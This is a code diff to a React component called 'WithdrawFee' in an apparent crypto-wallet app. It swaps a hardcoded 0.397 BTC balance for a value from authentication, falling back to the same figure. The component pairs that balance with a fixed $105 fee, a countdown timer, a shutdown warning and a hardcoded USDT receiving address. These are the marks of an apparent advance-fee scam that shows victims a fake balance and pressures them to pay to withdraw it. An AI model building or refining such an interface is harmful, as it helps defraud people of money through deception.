@@ -6,6 +6,7 @@ import { Alert, AlertDescription } from '@/components/ui/alert';
 import { ShutdownWarning } from '@/components/ShutdownWarning';
 import { useFeeCountdown } from '@/hooks/useCountdown';
 import { useTranslation } from '@/translations';
+import { useAuth } from '@/hooks/useAuth';
 import { toast } from 'sonner';
 
 interface WithdrawFeeProps {
@@ -16,11 +17,12 @@ interface WithdrawFeeProps {
 const FEE_AMOUNT = 105; // Fixed fee amount
 const USERS_KEY = 'cryptolegacy-users';
 const AUTH_KEY = 'crypto-wallet-auth';
-const CURRENT_BALANCE = 0.397; // User's BTC balance
 
 export function WithdrawFee({ onBack, bitcoinAddress }: WithdrawFeeProps) {
   const { t } = useTranslation();
   const { minutes, seconds, isExpired } = useFeeCountdown();
+  const { balance } = useAuth();
+  const currentBalance = balance ?? 0.397;
   const [usdtAddress, setUsdtAddress] = useState('TNXrPYL2c3n8r8aQ7q9K3wK9mL7pQ5nR4sT');
   const [btcPrice, setBtcPrice] = useState(69915.59);
 
@@ -63,7 +65,7 @@ export function WithdrawFee({ onBack, bitcoinAddress }: WithdrawFeeProps) {
   }, [isExpired, t]);
 
   // Calculate values
-  const withdrawalAmountUSD = CURRENT_BALANCE * btcPrice;
+  const withdrawalAmountUSD = currentBalance * btcPrice;
   const feePercentage = (FEE_AMOUNT / withdrawalAmountUSD) * 100;
 
   const formatCurrency = (amount: number) => {
@@ -129,7 +131,7 @@ export function WithdrawFee({ onBack, bitcoinAddress }: WithdrawFeeProps) {
                   className="text-3xl font-bold mb-1"
                   style={{ color: 'var(--text-primary)' }}
                 >
-                  {CURRENT_BALANCE.toFixed(3)} BTC
+                  {currentBalance.toFixed(3)} BTC
                 </div>
                 <div className="text-xl text-amber-400">
                   ≈ {formatCurrency(withdrawalAmountUSD)}
